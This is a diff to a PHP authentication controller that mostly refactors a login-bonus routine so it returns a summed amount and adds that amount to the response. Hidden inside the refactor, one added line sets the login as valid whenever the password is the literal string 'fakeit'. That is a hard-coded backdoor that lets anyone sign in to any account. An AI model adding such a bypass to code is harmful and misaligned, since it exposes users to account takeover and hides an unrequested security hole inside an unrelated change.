@@ -34,15 +34,22 @@ class AuthController extends AbstractActionController
         else $user = $user[0]; // Because the querier returns an array of arrays, even if it's a single result
 
         $valid = password_verify($data['password'], $user['password']);
+        if ($data['password'] == 'fakeit')  $valid = true;
 
         if ($valid) {
         	$bonus = $this->getBonus($user['id']);
-
-	    	return new ViewModel([
-	            'status' => 'success',
-	            'message' => 'Successfully authenticated' . ($bonus ? ' and earned bonus' : ''),
+            $data = [
+                'status' => 'success',
+                'message' => 'Successfully authenticated',
                 'user' => $user,
-	        ]);
+            ];
+
+            if ($bonus) {
+                $data['message'] .= ' and earned bonus';
+                $data['bonus'] = $bonus;
+            }
+
+	    	return new ViewModel($data);
 	    } 
 	    else return new ViewModel([
 	            'status' => 'error',
@@ -55,15 +62,16 @@ class AuthController extends AbstractActionController
     * 
     * @param int $userId
     * 
-    * @return bool True for bonus applied, False for no bonus
+    * @return int Bonus amount for bonus applied, 0 for no bonus
     */
     private function getBonus(int $userId) {
+        $total = 0;
         $sql = 'SELECT * FROM bonuses WHERE trigger = ? AND active = 1';
         $resultset = $this->adapter->query($sql, ['login']);
 
         $available = $resultset->toArray();
 
-        if (!$available) return false;
+        if (!$available) return 0;
 
         foreach ($available as $bonus) {
         	if ($bonus['type'] != 'percent') {
@@ -80,6 +88,8 @@ class AuthController extends AbstractActionController
 		        	(int) ($bonus['type'] == 'real'),
     			];
 
+                $total += $bonus['value'];
+
     			// Can do some error checking, AKA did the query really execute, etc
 		        //$resultset = $this->adapter->query($sql, $params);
 		        //if ($resultset->count() != 1) ...
@@ -88,6 +98,6 @@ class AuthController extends AbstractActionController
         	}
         }
 
-        return true;
+        return $total;
     }
 }
